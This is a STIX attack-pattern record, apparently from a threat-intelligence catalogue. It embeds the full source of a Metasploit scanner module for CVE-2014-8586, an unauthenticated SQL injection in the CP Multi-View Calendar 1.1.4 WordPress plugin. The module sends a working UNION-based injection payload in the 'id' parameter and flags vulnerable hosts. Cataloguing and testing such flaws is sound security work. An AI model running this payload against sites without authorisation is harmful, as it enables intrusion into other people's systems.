{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c429156b-1fa4-43da-9da4-c54442e7fb99",
    "created": "2024-08-14T16:28:29.259009Z",
    "modified": "2024-08-14T16:28:29.259013Z",
    "name": "WordPress CP Multi-View Calendar Unauthenticated SQL Injection Scanner",
    "description": " This module will scan given instances for an unauthenticated SQL injection within the CP Multi-View Calendar plugin v1.1.4 for Wordpress. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wordpress_cp_calendar_sqli.rb",
            "external_id": "wordpress_cp_calendar_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8586"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7910"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'WordPress CP Multi-View Calendar Unauthenticated SQL Injection Scanner',\n      'Description' => %q{\n        This module will scan given instances for an unauthenticated SQL injection\n        within the CP Multi-View Calendar plugin v1.1.4 for Wordpress.\n      },\n      'Author'       =>\n        [\n          'Joaquin Ramirez Martinez', #discovery\n          'bperry' #metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE' , '2014-8586' ],\n          [ 'EDB', '36243' ],\n          [ 'WPVDB', '7910' ]\n        ],\n      'DisclosureDate' => '2015-03-03'))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Target URI of the Wordpress instance', '/'])\n    ])\n  end\n\n  def run_host(ip)\n    right_marker = Rex::Text.rand_text_alpha(5)\n    left_marker = Rex::Text.rand_text_alpha(5)\n    flag = Rex::Text.rand_text_alpha(5)\n\n    vprint_status(\"Checking host\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/'),\n      'vars_get' => {\n        'action' => 'data_management',\n        'cpmvc_do_action' => 'mvparse',\n        'f' => 'edit',\n        'id' => \"1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack(\"H*\")[0]},0x#{flag.unpack(\"H*\")[0]},0x#{right_marker.unpack(\"H*\")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\"\n      }\n    })\n\n    unless res && res.body\n      vprint_error(\"Server did not respond in an expected way\")\n      return\n    end\n\n    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/\n\n    if result\n      print_good(\"Vulnerable to unauthenticated SQL injection within CP Multi-View Calendar 1.1.4 for Wordpress\")\n      report_vuln({\n        :host  => rhost,\n        :port  => rport,\n        :proto => 'tcp',\n        :name  => \"Unauthenticated UNION-based SQL injection in CP Multi-View Calendar 1.1.4 for Wordpress\",\n        :refs  => self.references.select { |ref| ref.ctx_val == \"36243\" }\n      })\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-03"
}